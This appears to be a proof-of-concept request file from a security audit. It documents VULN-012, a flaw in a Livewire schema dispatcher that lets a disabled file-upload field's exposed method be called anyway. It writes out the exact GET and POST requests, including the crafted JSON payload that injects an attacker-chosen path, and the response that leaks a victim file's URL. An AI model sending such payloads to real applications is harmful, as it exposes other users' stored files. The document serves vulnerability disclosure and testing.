### VULN-012 — decisive request. Full capture in response.txt / run.log.
### The generic schema dispatcher filters HIDDEN components but not DISABLED ones, then
### invokes any #[ExposedLivewireMethod]. So getUploadedFiles() (the VULN-004 oracle) is
### callable on a field the UI renders ->disabled().

### 1) Snapshot (page contains a FileUpload rendered disabled="disabled")
GET /forms/fields/file-upload HTTP/1.1
Host: localhost:21890

### 2) Invoke the exposed read method on the DISABLED field with an attacker path
POST /livewire/update HTTP/1.1
Host: localhost:21890
Content-Type: application/json
X-Livewire: true

{"_token":"<csrf>","components":[{"snapshot":"<forms.fields-demo snapshot>",
  "updates":{"data.fileUploadDisabled":{"inj":"disabled-victim-<suffix>/secret-<suffix>.txt"}},
  "calls":[{"path":"","method":"callSchemaComponentMethod",
            "params":["form.fileUploadDisabled","getUploadedFiles"]}]}]}

### Response effects.returns:
### [{"inj":{"name":"secret-<suffix>.txt","size":..,"type":"text/plain",
###          "url":"http://localhost:21890/storage/disabled-victim-<suffix>/secret-<suffix>.txt"}}]
### i.e. the oracle fired despite the field being disabled.
